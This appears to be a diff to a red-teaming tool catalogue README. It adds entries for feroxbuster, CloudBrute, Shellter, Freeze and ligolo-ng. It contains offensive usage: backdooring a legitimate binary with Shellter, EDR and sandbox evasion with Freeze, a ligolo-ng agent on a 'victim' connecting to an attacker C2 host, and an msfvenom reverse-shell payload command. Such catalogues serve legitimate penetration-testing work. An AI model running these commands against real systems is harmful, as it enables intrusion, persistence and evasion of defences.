@@ -4,7 +4,7 @@
 <img src="https://user-images.githubusercontent.com/100603074/210680426-20a92131-56f9-43ad-be82-f449e3215dda.png" height="300">
 </p>
 
-This github repository contains a collection of **100+** **tools** and **resources** that can be useful for **red teaming activities**. 
+This github repository contains a collection of **110+** **tools** and **resources** that can be useful for **red teaming activities**. 
 
 Some of the tools may be specifically designed for red teaming, while others are more general-purpose and can be adapted for use in a red teaming context.
 
@@ -43,7 +43,7 @@ Some of the tools may be specifically designed for red teaming, while others are
 </details>
 
 <details open>
-    <summary><b>Reconnaissance</b> $\textcolor{gray}{\text{18 tools}}$</summary>
+    <summary><b>Reconnaissance</b> $\textcolor{gray}{\text{20 tools}}$</summary>
     <ul>
         <ul>
             <li><b><a href="#crtsh---httprobe---eyewitness">crt.sh -> httprobe -> EyeWitness</a></b><i> Automated domain screenshotting</i></li>
@@ -51,6 +51,8 @@ Some of the tools may be specifically designed for red teaming, while others are
             <li><b><a href="#nuclei">nuclei</a></b><i> Vulnerability scanner</i></li>
             <li><b><a href="#certsniff">certSniff</a></b><i> Certificate transparency log keyword sniffer</i></li>
             <li><b><a href="#gobuster">gobuster</a></b><i> Website path brute force</i></li>
+            <li><b><a href="#feroxbuster">feroxbuster</a></b><i> Fast content discovery tool written in Rust</i></li>
+            <li><b><a href="#cloudbrute">CloudBrute</a></b><i> Cloud infrastructure brute force</i></li>
             <li><b><a href="#dnsrecon">dnsrecon</a></b><i> Enumerate DNS records</i></li>
             <li><b><a href="#shodanio">Shodan.io</a></b><i> Public facing system knowledge base</i></li>
             <li><b><a href="#aort">AORT (All in One Recon Tool)</a></b><i> Subdomain enumeration</i></li>
@@ -69,11 +71,13 @@ Some of the tools may be specifically designed for red teaming, while others are
 </details>
 
 <details open>
-    <summary><b>Resource Development</b> $\textcolor{gray}{\text{5 tools}}$</summary>
+    <summary><b>Resource Development</b> $\textcolor{gray}{\text{7 tools}}$</summary>
     <ul>
         <ul>
             <li><b><a href="#chimera">Chimera</a></b><i> PowerShell obfuscation</i></li>
             <li><b><a href="#msfvenom">msfvenom</a></b><i> Payload creation</i></li>
+            <li><b><a href="#shellter">Shellter</a></b><i> Dynamic shellcode injection tool</i></li>
+            <li><b><a href="#freeze">Freeze</a></b><i> Payload creation (circumventing EDR)</i></li>
             <li><b><a href="#wsh">WSH</a></b><i> Wsh payload</i></li>
             <li><b><a href="#hta">HTA</a></b><i> Hta  payload</i></li>
             <li><b><a href="#vba">VBA</a></b><i> Vba  payload</i></li>
@@ -113,12 +117,13 @@ Some of the tools may be specifically designed for red teaming, while others are
 </details>
 
 <details open>
-    <summary><b>Persistence</b> $\textcolor{gray}{\text{3 tools}}$</summary>
+    <summary><b>Persistence</b> $\textcolor{gray}{\text{4 tools}}$</summary>
     <ul>
         <ul>
             <li><b><a href="#impacket">Impacket</a></b><i> Python script suite</i></li>
             <li><b><a href="#empire">Empire</a></b><i> Post-exploitation framework</i></li>
             <li><b><a href="#sharpersist">SharPersist</a></b><i> Windows persistence toolkit</i></li>
+            <li><b><a href="#ligolo-ng">ligolo-ng</a></b><i> Tunneling tool that uses a TUN interface</i></li>
         </ul>
     </ul>
 </details>
@@ -506,6 +511,85 @@ gobuster dir -u "https://google.com" -w /usr/share/wordlists/dirb/big.txt --wild
 
 ![image](https://user-images.githubusercontent.com/100603074/192146594-86f04a85-fce3-4c4c-bcd6-2bf6a6222241.png)
 
+### [🔙](#tool-list)[feroxbuster](https://github.com/epi052/feroxbuster)
+
+A tool designed to perform Forced Browsing, an attack where the aim is to enumerate and access resources that are not referenced by the web application, but are still accessible by an attacker.
+
+Feroxbuster uses brute force combined with a wordlist to search for unlinked content in target directories. These resources may store sensitive information about web applications and operational systems, such as source code, credentials, internal network addressing, etc...
+
+**Install: (Kali)** 
+
+```bash
+sudo apt update && sudo apt install -y feroxbuster
+```
+
+**Install: (Mac)** 
+
+```bash
+curl -sL https://raw.githubusercontent.com/epi052/feroxbuster/master/install-nix.sh | bash
+```
+
+**Install: (Windows)** 
+
+```bash
+Invoke-WebRequest https://github.com/epi052/feroxbuster/releases/latest/download/x86_64-windows-feroxbuster.exe.zip -OutFile feroxbuster.zip
+Expand-Archive .\feroxbuster.zip
+.\feroxbuster\feroxbuster.exe -V
+```
+
+For full installation instructions see [here](https://epi052.github.io/feroxbuster-docs/docs/installation/).
+
+**Usage:** 
+
+```bash
+# Add .pdf, .js, .html, .php, .txt, .json, and .docx to each url
+./feroxbuster -u http://127.1 -x pdf -x js,html -x php txt json,docx
+
+# Scan with headers
+./feroxbuster -u http://127.1 -H Accept:application/json "Authorization: Bearer {token}"
+
+# Read URLs from stdin
+cat targets | ./feroxbuster --stdin --silent -s 200 301 302 --redirects -x js | fff -s 200 -o js-files
+
+# Proxy requests through burpsuite
+./feroxbuster -u http://127.1 --insecure --proxy http://127.0.0.1:8080
+```
+
+Full usage examples can be found [here](https://epi052.github.io/feroxbuster-docs/docs/examples/).
+
+![image](https://user-images.githubusercontent.com/100603074/216729079-7a80f942-a692-4e91-8ffc-7d91d8d69d21.png)
+
+*Image used from https://raw.githubusercontent.com/epi052/feroxbuster/main/img/demo.gif*
+
+### [🔙](#tool-list)[CloudBrute](https://github.com/0xsha/CloudBrute)
+
+A tool to find a company (target) infrastructure, files, and apps on the top cloud providers (Amazon, Google, Microsoft, DigitalOcean, Alibaba, Vultr, Linode).
+
+Features:
+
+- Cloud detection (IPINFO API and Source Code)
+- Fast (concurrent)
+- Cross Platform (windows, linux, mac)
+- User-Agent Randomization
+- Proxy Randomization (HTTP, Socks5)
+
+**Install:** 
+
+Download the latest [release](https://github.com/0xsha/CloudBrute/releases) for your system and follow the usage.
+
+**Usage:** 
+
+```bash
+# Specified target, generate keywords based off 'target', 80 threads with a timeout of 10, wordlist 'storage_small.txt'
+CloudBrute -d target.com -k target -m storage -t 80 -T 10 -w "./data/storage_small.txt"
+
+# Output results to file
+CloudBrute -d target.com -k keyword -m storage -t 80 -T 10 -w -c amazon -o target_output.txt
+```
+
+![image](https://user-images.githubusercontent.com/100603074/216729172-5d58d005-85a8-49f2-8968-98b459961f81.png)
+
+*Image used from https://github.com/0xsha/CloudBrute*
 
 ### [🔙](#tool-list)[dnsrecon](https://www.kali.org/tools/dnsrecon/#dnsrecon)
 
@@ -940,6 +1024,81 @@ msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.3 lport=443 -f hta-psh > s
 ```
 
 ![image](https://user-images.githubusercontent.com/100603074/192070870-2e65fc9f-6534-42e2-af27-9d8b54a82f0b.png)
+
+### [🔙](#tool-list)[Shellter](https://www.shellterproject.com/)
+
+Shellter is a dynamic shellcode injection tool, and the first truly dynamic PE infector ever created.
+
+It can be used in order to inject shellcode into native Windows applications (currently 32-bit applications only).
+
+Shellter takes advantage of the original structure of the PE file and doesn’t apply any modification such as changing memory access permissions in sections (unless the user wants), adding an extra section with RWE access, and whatever would look dodgy under an AV scan.
+
+Full README information can be found [here](https://www.shellterproject.com/Downloads/Shellter/Readme.txt).
+
+**Install: (Kali)** 
+
+```bash
+apt-get update
+apt-get install shellter
+```
+
+**Install: (Windows)** 
+
+Visit the [download page](https://www.shellterproject.com/download/) and install.
+
+**Usage:** 
+
+Just pick a legit binary to backdoor and run Shellter.
+
+Some nice tips can be found [here](https://www.shellterproject.com/tipstricks/).
+
+Lots of community usage demos can be found [here](https://www.shellterproject.com/shellter-community-demos/).
+
+![image](https://user-images.githubusercontent.com/100603074/216729343-612cde48-0ce1-48e6-b342-5252193a974c.png)
+
+*Image used from https://www.kali.org/tools/shellter/images/shellter.png*
+
+### [🔙](#tool-list)[Freeze](https://github.com/optiv/Freeze)
+
+Freeze is a payload creation tool used for circumventing EDR security controls to execute shellcode in a stealthy manner. 
+
+Freeze utilizes multiple techniques to not only remove Userland EDR hooks, but to also execute shellcode in such a way that it circumvents other endpoint monitoring controls.
+
+**Install:** 
+
+```bash
+git clone https://github.com/optiv/Freeze
+cd Freeze
+go build Freeze.go
+```
+
+**Usage:** 
+
+```
+  -I string
+        Path to the raw 64-bit shellcode.
+  -O string
+        Name of output file (e.g. loader.exe or loader.dll). Depending on what file extension defined will determine if Freeze makes a dll or exe.
+  -console
+        Only for Binary Payloads - Generates verbose console information when the payload is executed. This will disable the hidden window feature.
+  -encrypt
+        Encrypts the shellcode using AES 256 encryption
+  -export string
+        For DLL Loaders Only - Specify a specific Export function for a loader to have.
+  -process string
+        The name of process to spawn. This process has to exist in C:\Windows\System32\. Example 'notepad.exe' (default "notepad.exe")
+  -sandbox
+        Enables sandbox evasion by checking:
+                Is Endpoint joined to a domain?
+                Does the Endpoint have more than 2 CPUs?
+                Does the Endpoint have more than 4 gigs of RAM?
+  -sha256
+        Provides the SHA256 value of the loaders (This is useful for tracking)
+```
+
+![image](https://user-images.githubusercontent.com/100603074/216729312-6e03f5d2-29a7-4190-8187-daecebfc6a9c.png)
+
+*Image used from https://www.blackhatethicalhacking.com/tools/freeze/*
 
 ### [🔙](#tool-list)WSH
 
@@ -1612,6 +1771,75 @@ SharPersist -t startupfolder -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -
 
 ![image](https://user-images.githubusercontent.com/100603074/208880117-3ce7eefc-9e0b-477d-ada4-b3867909ff38.png)
 
+### [🔙](#tool-list)[ligolo-ng](https://github.com/nicocha30/ligolo-ng)
+
+Ligolo-ng is a simple, lightweight and fast tool that allows pentesters to establish tunnels from a reverse TCP/TLS connection using a tun interface (without the need of SOCKS).
+
+Instead of using a SOCKS proxy or TCP/UDP forwarders, Ligolo-ng creates a userland network stack using [Gvisor](https://gvisor.dev/).
+
+When running the relay/proxy server, a tun interface is used, packets sent to this interface are translated, and then transmitted to the agent remote network.
+
+**Install: (Download)** 
+
+Precompiled binaries (Windows/Linux/macOS) are available on the [Release page](https://github.com/nicocha30/ligolo-ng/releases).
+
+**Install: (Build)** 
+
+*Building ligolo-ng (Go >= 1.17 is required):*
+
+```bash
+go build -o agent cmd/agent/main.go
+go build -o proxy cmd/proxy/main.go
+
+# Build for Windows
+GOOS=windows go build -o agent.exe cmd/agent/main.go
+GOOS=windows go build -o proxy.exe cmd/proxy/main.go
+```
+
+**Setup: (Linux)** 
+
+```bash
+sudo ip tuntap add user [your_username] mode tun ligolo
+sudo ip link set ligolo up
+```
+
+**Setup: (Windows)** 
+
+You need to download the [Wintun](https://www.wintun.net/) driver (used by [WireGuard](https://www.wireguard.com/)) and place the `wintun.dll` in the same folder as Ligolo (make sure you use the right architecture).
+
+**Setup: (Proxy server)** 
+
+```bash
+./proxy -h # Help options
+./proxy -autocert # Automatically request LetsEncrypt certificates
+```
+
+**Usage:**
+
+*Start the agent on your target (victim) computer (no privileges are required!):*
+
+```bash
+./agent -connect attacker_c2_server.com:11601
+```
+
+A session should appear on the proxy server.
+
+```
+INFO[0102] Agent joined. name=nchatelain@nworkstation remote="XX.XX.XX.XX:38000"
+```
+
+Use the session command to select the agent.
+
+```
+ligolo-ng » session 
+? Specify a session : 1 - nchatelain@nworkstation - XX.XX.XX.XX:38000
+```
+
+Full usage information can be found [here](https://github.com/nicocha30/ligolo-ng#using-ligolo-ng).
+
+![image](https://user-images.githubusercontent.com/100603074/216729440-80871cad-4c06-4eb5-8e91-d083ea3f1d2b.png)
+
+*Image used from https://github.com/nicocha30/ligolo-ng#demo*
 
 Privilege Escalation
 ====================
